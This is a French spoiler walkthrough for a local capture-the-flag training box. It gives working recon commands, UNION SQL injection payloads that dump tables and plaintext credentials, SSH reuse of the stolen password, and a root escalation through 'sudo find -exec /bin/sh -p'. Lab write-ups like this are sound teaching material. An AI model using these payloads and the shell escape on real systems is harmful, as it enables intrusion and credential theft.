# Corrigé — spoilers

Toutes les commandes visent exclusivement la box locale. Sur l’hôte Linux, ajouter son IP dans `/etc/hosts` comme indiqué dans le guide. Depuis le poste d’attaque Docker, le même nom est résolu automatiquement.

## 1. Reconnaissance

```bash
nmap -sT -Pn -sV -p- legacy-telecom.hns
curl http://legacy-telecom.hns/robots.txt
curl 'http://legacy-telecom.hns/legacy/offer?id=1'
```

Le fichier robots indique `/legacy/`. Le catalogue utilise le paramètre `id`.

## 2. Injection SQL

Déclencher une erreur :

```bash
curl -G 'http://legacy-telecom.hns/legacy/offer' --data-urlencode "id=1'"
```

Le diagnostic révèle une requête à quatre colonnes :

```sql
SELECT id, name, price, description FROM offers WHERE id = …
```

Énumérer le schéma SQLite :

```bash
curl -G 'http://legacy-telecom.hns/legacy/offer' \
  --data-urlencode "id=-1 UNION SELECT 1,name,sql,'schema' FROM sqlite_master WHERE type='table' -- "
```

La table `employees` contient `id`, `username`, `password`, `role`. Lire le compte de maintenance :

```bash
curl -G 'http://legacy-telecom.hns/legacy/offer' \
  --data-urlencode 'id=-1 UNION SELECT id,username,password,role FROM employees -- '
```

La fiche affiche `support` et un mot de passe aléatoire commençant par `LT-`. Il faut le découvrir dans ta propre instance.

## 3. Flag user

```bash
ssh support@legacy-telecom.hns
# Saisir le mot de passe récupéré dans le catalogue.
id
cat ~/user.txt
sudo -l
```

La règle autorise `/usr/bin/find` comme root sans mot de passe, avec des arguments non restreints.

## 4. Flag root

Dans la session SSH :

```bash
sudo /usr/bin/find /srv/archive -maxdepth 0 -exec /bin/sh -p \;
id
cat /root/root.txt
exit
```

L’option `-exec` lance le shell avec les privilèges du programme `find`, lui-même exécuté comme root. `id` doit indiquer `uid=0`. Le flag root était inaccessible avant cette élévation.

## 5. Validation et bilan

Dans un terminal de l’hôte :

```bash
./lab.sh check user
./lab.sh check root
```

Chaîne pédagogique : page historique oubliée → concaténation SQL → secret en clair → réutilisation sur SSH → commande `sudo` trop permissive → root du conteneur.

Après l’exercice, identifier les correctifs dans la [fiche historique](HISTOIRE.md). `./lab.sh reset` permet une nouvelle partie avec de nouveaux secrets.
